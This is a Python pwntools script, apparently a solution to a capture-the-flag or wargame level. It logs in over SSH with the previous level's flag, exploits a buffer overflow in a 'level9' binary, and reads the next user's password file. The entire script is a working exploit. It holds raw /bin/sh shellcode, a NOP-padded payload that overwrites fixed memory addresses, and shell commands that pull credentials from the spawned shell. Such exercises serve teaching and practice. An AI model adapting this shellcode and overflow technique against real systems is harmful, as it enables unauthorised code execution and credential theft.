#!/usr/bin/python3

from pwn import *

host = '10.11.248.120'
port = 4242
user = 'level9'
password = open("../level8/flag", "rb").read()

with ssh(user=user, host=host, port=port, password=password) as s:
       
    SYSTEM      = 0xb7d86060
    A_BUFFER    = 0x0804a00c

    shellcode = b'\xB8\xFF\x2F\x73\x68\xC1\xE8\x08\x50\x68\x2F\x62\x69\x6E\x89\xE3\x31\xD2\x52\x53\x89\xE1\x31\xC0\xB0\x0B\xCD\x80'

    payload = p32(A_BUFFER + 4)
    payload += shellcode
    payload +=  b'\x90' * (104 - len(shellcode))
    payload += p32(A_BUFFER)

    p = s.process(["./level9", payload])

    def ssh_send(line):
        if type(line) == str:
            line = line.encode("utf-8")
        elif type(line) != bytes:
            print("[x] Wrong data format !")
            raise ValueError
        print(f"[x] Sending: {line!r}")
        p.sendline(line)

    def ssh_recv(timeout = 1.0) -> str:
        data = p.recv(timeout=timeout)
        text = data.decode(errors='ignore')
        print(f"[x] Received: {text!r}")
        return text

    def wait_for_shell():
        while True:
            output = ssh_recv()
            if output == "$ ":
                break
    
    try:
        
        wait_for_shell()
        ssh_send("cat /home/user/bonus0/.pass")
        flag = ssh_recv().split('\n')[0]
    
    except ValueError:
        exit(1)

    print(f"\nbonus0 password: {flag}\n")

    flagfile = open("flag", "wb")
    flagfile.write(flag.encode("utf-8"))

    s.close()



